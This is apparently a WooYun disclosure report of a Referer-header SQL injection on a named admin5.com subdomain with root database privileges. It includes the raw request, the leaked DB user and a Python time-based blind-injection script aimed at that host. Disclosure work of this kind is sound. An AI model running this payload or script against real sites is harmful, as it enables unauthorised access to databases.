wybug_title: A5站长网某站点MySQL注射(root权限附验证脚本)
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2014-12-20：	细节已通知厂商并且等待厂商处理中									2014-12-25：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： A5站长网某站点MySQL注射(root权限,附验证脚本) 详细说明：  注入点：
GET / HTTP/1.1Referer: aaa*User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36X-Requested-With: XMLHttpRequestCookie: PHPSESSID=2oe34dibm17etfkjn5nqhn2nn1Host: yun.admin5.comConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */*
Referer可注入。   漏洞证明：  MySQL user():
root@localhost


python脚本：
import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'Cookie': 'PHPSESSID=2oe34dibm17etfkjn5nqhn2nn1',    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')print 'Try to retrive MySQL user:'user = ''for i in range(1, 15):    for payload in payloads:        timeout_count = 0        for j in range(1, 3):            try:                conn = httplib.HTTPConnection('yun.admin5.com', timeout=2)                random.seed()                referer = str(random.random()) + "aaa'XOR(if(ascii(mid(user(),%s,1))=%s,sleep(1),0))OR'bbb"  % (i, ord(payload))                headers['Referer'] = referer                conn.request(method='GET', url= '/', headers = headers)                conn.getresponse()                conn.close()                print '.',                break            except:                timeout_count += 1        if timeout_count == 2:    # 2 times to confirm            user += payload            print '\n[In Progress]', user             breakprint '\n[Done], SQL Server version is', user
   修复方案：  过滤，转义   版权声明：转载请注明来源 lijiejie@乌云
